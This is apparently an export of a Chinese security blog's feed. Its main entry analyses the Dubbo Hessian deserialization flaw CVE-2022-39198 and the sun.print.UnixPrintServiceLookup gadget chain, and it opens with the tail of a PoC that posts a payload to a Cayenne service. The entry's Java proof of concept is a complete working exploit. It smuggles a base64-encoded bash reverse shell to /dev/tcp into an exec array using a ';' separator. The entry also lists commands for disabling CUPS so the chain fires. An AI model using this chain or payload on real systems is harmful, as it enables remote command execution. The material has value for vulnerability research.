class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">maskmap</span><span class="hljs-params">(Object u1,Object u2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> node.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, node);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, u1, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, u2, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> node.getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        key.setAccessible(<span class="hljs-literal">true</span>);<br>        key.set(node1, u1);<br>        key.set(node2, u2);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> HashMap.class.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>        size.setAccessible(<span class="hljs-literal">true</span>);<br>        size.set(hashMap, <span class="hljs-number">2</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        table.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">arr</span> <span class="hljs-operator">=</span> Array.newInstance(node, <span class="hljs-number">2</span>);<br>        Array.set(arr, <span class="hljs-number">0</span>, node1);<br>        Array.set(arr, <span class="hljs-number">1</span>, node2);<br>        table.set(hashMap, arr);<br><br>        <span class="hljs-keyword">return</span> hashMap;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">post</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(&quot;127.0.0.1&quot;, 8088));</span><br>        URL url=<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8080/cayenne-service&quot;</span>);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        con.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/hessian&quot;</span>);<br>        con.setRequestProperty(<span class="hljs-string">&quot;Authorization&quot;</span>, <span class="hljs-string">&quot;Basic Y2F5ZW5uZS11c2VyOnNlY3JldA==&quot;</span>);<br>        con.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        con.setDoOutput(<span class="hljs-literal">true</span>);<br>        con.setDoInput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">try</span>(<span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> con.getOutputStream()) &#123;<br>            os.write(b);<br>        &#125;<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(con.getInputStream()));<br>        String line;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            response.append(line);<br>        &#125;<br>        reader.close();<br><br>        <span class="hljs-comment">// 打印响应内容</span><br>        System.out.println(<span class="hljs-string">&quot;Response Body: &quot;</span> + response.toString());<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><a href="https://lists.apache.org/thread/zthjy83t3o66x7xcbygn2vg3yjvlc9vc">https://lists.apache.org/thread/zthjy83t3o66x7xcbygn2vg3yjvlc9vc</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hessian反序列_Print—gadget</title>
    <link href="/2024/02/28/hessian%E5%8F%8D%E5%BA%8F%E5%88%97-Print%E2%80%94gadget/"/>
    <url>/2024/02/28/hessian%E5%8F%8D%E5%BA%8F%E5%88%97-Print%E2%80%94gadget/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-dubbo-CVE-2022-39198"><a href="#0x01-dubbo-CVE-2022-39198" class="headerlink" title="0x01 dubbo CVE-2022-39198"></a>0x01 dubbo CVE-2022-39198</h3><p>2.7.x &lt; version &lt; 2.7.18</p><p>3.0.x &lt; version &lt; 3.0.12</p><p>3.1.x &lt; version &lt;&#x3D; 3.1.0</p><p>我们看看github的diff</p><p><a href="https://github.com/apache/dubbo-hessian-lite/commit/5727b36a3cdc428baeef7ee03b131905e39be8ad">https://github.com/apache/dubbo-hessian-lite/commit/5727b36a3cdc428baeef7ee03b131905e39be8ad</a></p><p>主要的更改是在<code>resources/DENY_CLASS</code>文件中</p><p>这个文件中，是这个项目维护的一个黑名单</p><p>从这次的修复中，多新增了好几个黑名单包名</p><p><img src="image-20240229001709293.png" alt="image-20240229001709293"></p><blockquote><p>org.apache.commons.codec.</p><p>org.aspectj.</p><p>org.dom4j</p><p>org.junit.</p><p>org.mockito.</p><p>org.thymeleaf.</p><p>ognl.</p><p>sun.print.</p></blockquote><p>有很多，但是在其中只是存在有一个存在于JDK中的包名，即为<code>sun.print.</code>，这里仅是主要探讨有关于JDK中的利用链进行学习</p><p>如果曾经更进过hessian以前的其他链子，你会发现，大多数的链子都是通过使用<code>HashMap / HashSet / HashTable</code>等类来触发<code>equals/hashcode / compareTo</code>等等方法来进行接下来的调用</p><p>而其中，marshal项目中存在有多个通过调用<code>XString#equals</code>方法的方式</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221216231300-210f8ade-7d54-1.png"><img src="image-20240229001852359.png" alt="image-20240229001852359"></a></p><p>进而调用到其他类的<code>toString</code>方法进行接下来 的调用</p><h3 id="0x02-sun-print-分析"><a href="#0x02-sun-print-分析" class="headerlink" title="0x02 sun.print 分析"></a>0x02 sun.print 分析</h3><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">run:<span class="hljs-number">897</span>, UnixPrintServiceLookup$<span class="hljs-number">1</span> (sun.print)<br>doPrivileged:-<span class="hljs-number">1</span>, AccessController (java.security)<br>execCmd:<span class="hljs-number">888</span>, UnixPrintServiceLookup (sun.print)<br>getDefaultPrinterNameBSD:<span class="hljs-number">750</span>, UnixPrintServiceLookup (sun.print)<br>getDefaultPrintService:<span class="hljs-number">663</span>, UnixPrintServiceLookup (sun.print)<br>refreshServices:<span class="hljs-number">277</span>, UnixPrintServiceLookup (sun.print)<br>getPrintServices:<span class="hljs-number">233</span>, UnixPrintServiceLookup (sun.print)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">158</span>, ToStringBean (com.rometools.rome.feed.impl)<br>toString:<span class="hljs-number">129</span>, ToStringBean (com.rometools.rome.feed.impl)<br>beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hashCode:<span class="hljs-number">180</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hash:<span class="hljs-number">338</span>, HashMap (java.util)<br>put:<span class="hljs-number">611</span>, HashMap (java.util)<br>readMap:<span class="hljs-number">114</span>, MapDeserializer (com.caucho.hessian.io)<br>readMap:<span class="hljs-number">577</span>, SerializerFactory (com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2093</span>, Hessian2Input (com.caucho.hessian.io)<br>main:<span class="hljs-number">99</span>, hessian_tostring (com.ser)<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">sun</span>.<span class="hljs-keyword">print</span>.UnixPrintServiceLookup<br></code></pre></td></tr></table></figure><p><img src="image-20240229002034259.png" alt="image-20240229002034259"></p><p>有public 无参构造方法</p><p><img src="image-20240229002244293.png" alt="image-20240229002244293"></p><p>这个类中存在众多properties.这条连主要就是由PrintServices这个触发，PrintServices会掉哟过defPrintServices，所以一个样。</p><p><img src="image-20240229002459732.png" alt="image-20240229002459732"></p><p><img src="image-20240229002512520.png" alt="image-20240229002512520"></p><p>也就是说会触发多次。</p><p>sun.print.UnixPrintServiceLookup#getDefaultPrintService()</p><p><img src="image-20240229002732411.png" alt="image-20240229002732411"></p><p>要出发命令，需要走到getDefaultPrinterNameBSD()这个方法</p><p><img src="image-20240229002900212.png" alt="image-20240229002900212"></p><p><img src="image-20240229002838686.png" alt="image-20240229002838686"></p><p><img src="image-20240229002950452.png" alt="image-20240229002950452"></p><p>首先会判断CUPS server是否开启，然后判断是不是系统是不是mac或者sun。osname是属性，可以直接利用反射修改。</p><p>CUPS server可以使用关闭</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo systemctl mask cups<br>reboot<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># mac</span></span><br>sudo launchctl stop org.cups.cupsd<br>sudo launchctl disable system/org.cups.cupsd<br></code></pre></td></tr></table></figure><p>sun.print.UnixPrintServiceLookup#getDefaultPrinterNameBSD()</p><p><img src="image-20240229003213401-9137933.png" alt="image-20240229003213401"></p><p>可以看到这里的判断。直接反射修改就好了</p><p><img src="image-20240229003306236.png" alt="image-20240229003306236"></p><p>需要注意lpcFirstCom是一个数组。</p><p>sun.print.UnixPrintServiceLookup#execCmd()</p><p><img src="image-20240229003415540.png" alt="image-20240229003415540"></p><p>调用后判断一下系统，然后赋值var2数组，最后exec。</p><p>总结需要一个触发getter的类，去触发getDefaultPrinter()。其中要满足cpus服务为false，其余都可以使用反射修改。可以想到rome，fastjson，jackson等去调用getter</p><h3 id="0x03-poc"><a href="#0x03-poc" class="headerlink" title="0x03 poc"></a>0x03 poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">run:<span class="hljs-number">897</span>, UnixPrintServiceLookup$<span class="hljs-number">1</span> (sun.print)<br>doPrivileged:-<span class="hljs-number">1</span>, AccessController (java.security)<br>execCmd:<span class="hljs-number">888</span>, UnixPrintServiceLookup (sun.print)<br>getDefaultPrinterNameBSD:<span class="hljs-number">750</span>, UnixPrintServiceLookup (sun.print)<br>getDefaultPrintService:<span class="hljs-number">663</span>, UnixPrintServiceLookup (sun.print)<br>refreshServices:<span class="hljs-number">277</span>, UnixPrintServiceLookup (sun.print)<br>getPrintServices:<span class="hljs-number">233</span>, UnixPrintServiceLookup (sun.print)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">158</span>, ToStringBean (com.rometools.rome.feed.impl)<br>toString:<span class="hljs-number">129</span>, ToStringBean (com.rometools.rome.feed.impl)<br>beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hashCode:<span class="hljs-number">180</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hash:<span class="hljs-number">338</span>, HashMap (java.util)<br>put:<span class="hljs-number">611</span>, HashMap (java.util)<br>readMap:<span class="hljs-number">114</span>, MapDeserializer (com.caucho.hessian.io)<br>readMap:<span class="hljs-number">577</span>, SerializerFactory (com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2093</span>, Hessian2Input (com.caucho.hessian.io)<br>main:<span class="hljs-number">99</span>, hessian_tostring (com.ser)<br></code></pre></td></tr></table></figure><p>以rome为列</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ser;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javafx.beans.property.Property;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.print.CUPSPrinter;<br><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessian_tostring</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafe</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafe.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafe.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(UnixPrintServiceLookup.class);<br>      <span class="hljs-comment">// 因为是数组形式exec，所以使用;来截断，在执行后面。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;;sh -c &#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;sh,-i&#125;&#x27;&quot;</span>;<br><span class="hljs-comment">//        String cmd = &quot;open .&quot;;</span><br>        setFieldValue(lookup, <span class="hljs-string">&quot;osname&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>        setFieldValue(lookup,<span class="hljs-string">&quot;lpcFirstCom&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;cmd,cmd,cmd&#125;);<br>        setFieldValue(lookup, <span class="hljs-string">&quot;cmdIndex&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(lookup.getClass(),lookup));<br><br><span class="hljs-comment">//防止序列化的时候执行</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> maskmap(equalsBean, equalsBean);<br><br><br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./hessiantwo&quot;</span>));<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.flushBuffer();<br><br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./hessiantwo&quot;</span>));<br>        hessian2Input.readObject();<br><br><span class="hljs-comment">//        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="hljs-comment">//        ObjectOutputStream outputStream = new ObjectOutputStream(baos);</span><br><span class="hljs-comment">//        outputStream.writeObject(hashMap);</span><br><span class="hljs-comment">//        outputStream.close();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="hljs-comment">//        ObjectInputStream Input = new ObjectInputStream(bais);</span><br><span class="hljs-comment">//        Input.readObject();</span><br><span class="hljs-comment">//        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./hessian_tostring&quot;));</span><br><span class="hljs-comment">//        outputStream.writeObject(hashMap);</span><br><span class="hljs-comment">//        outputStream.close();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./hessian_tostring&quot;));</span><br><span class="hljs-comment">//        inputStream.readObject();</span><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">maskmap</span><span class="hljs-params">(Object u1,Object u2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> node.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, node);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, u1, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, u2, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> node.getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        key.setAccessible(<span class="hljs-literal">true</span>);<br>        key.set(node1, u1);<br>        key.set(node2, u2);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> HashMap.class.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>        size.setAccessible(<span class="hljs-literal">true</span>);<br>        size.set(hashMap, <span class="hljs-number">2</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        table.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">arr</span> <span class="hljs-operator">=</span> Array.newInstance(node, <span class="hljs-number">2</span>);<br>        Array.set(arr, <span class="hljs-number">0</span>, node1);<br>        Array.set(arr, <span class="hljs-number">1</span>, node2);<br>        table.set(hashMap, arr);<br><br>        <span class="hljs-keyword">return</span> hashMap;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><a href="https://xz.aliyun.com/t/11961?time__1311=mqmx0DBG0Qi=Ax0veeqBKuGUD97oDn767YD&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/11961?time__1311=mqmx0DBG0Qi%3DAx0veeqBKuGUD97oDn767YD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/17020853.html">https://www.cnblogs.com/kingbridge/articles/17020853.html</a></p><p><a href="https://pupil857.github.io/2022/12/08/NCTF2022-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/">https://pupil857.github.io/2022/12/08/NCTF2022-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java-gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxljob-2.4.0代码审计</title>
    <link href="/2024/02/20/xxljob-2-4-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/02/20/xxljob-2-4-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
